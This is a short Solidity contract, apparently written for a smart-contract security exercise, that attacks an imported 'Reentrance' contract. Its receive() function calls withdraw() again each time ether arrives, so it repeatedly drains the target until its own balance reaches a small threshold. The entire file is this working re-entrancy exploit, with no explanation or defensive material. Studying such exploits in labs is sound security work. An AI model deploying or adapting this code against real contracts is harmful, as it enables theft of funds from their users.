// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Re-entrancy.sol";

contract Test {
    Reentrance public re;

    constructor(address payable addr) public {
        re = Reentrance(addr);
    }

    function withdraw() public {
        re.withdraw(0.001 ether);
    }

    function addFunds() public payable {}

    receive() external payable {
        if (address(this).balance < 0.002 ether) {
            withdraw();
        }
    }
}
